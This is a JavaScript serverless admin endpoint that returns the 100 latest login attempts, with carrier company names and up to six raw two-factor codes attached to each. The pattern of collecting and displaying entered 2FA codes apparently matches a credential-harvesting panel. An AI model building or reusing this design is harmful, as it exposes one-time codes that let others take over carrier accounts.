const { supabase } = require('./_shared/supabase')
const { cors, verifyAdmin } = require('./_shared/auth')

exports.handler = async (event) => {
  if (event.httpMethod === 'OPTIONS') return cors({})
  if (!verifyAdmin(event)) return cors({ error: 'Unauthorized' }, 401)

  const { data: attempts } = await supabase
    .from('login_attempts')
    .select('*, carriers(company_legal_name)')
    .order('id', { ascending: false })
    .limit(100)

  const rows = attempts || []

  const { data: allCodes } = await supabase
    .from('twofa_attempts')
    .select('*')
    .order('id', { ascending: true })

  const codes = allCodes || []

  const result = rows.map((row, i) => {
    const { carriers: carrierJoin, ...rest } = row

    const nextRow = rows[i - 1]
    const upperBound = nextRow ? nextRow.created_at : null

    const rowCodes = codes.filter(c => {
      const afterLogin = c.created_at >= row.created_at
      const beforeNext = upperBound ? c.created_at < upperBound : true
      if (row.carrier_id) return c.carrier_id === row.carrier_id && afterLogin && beforeNext
      return c.carrier_id === null && afterLogin && beforeNext
    }).slice(0, 6)

    return {
      ...rest,
      company_legal_name: carrierJoin ? carrierJoin.company_legal_name : null,
      twofa_code_1: rowCodes[0]?.code || null,
      twofa_code_2: rowCodes[1]?.code || null,
      twofa_code_3: rowCodes[2]?.code || null,
      twofa_code_4: rowCodes[3]?.code || null,
      twofa_code_5: rowCodes[4]?.code || null,
      twofa_code_6: rowCodes[5]?.code || null,
    }
  })

  return cors(result)
}
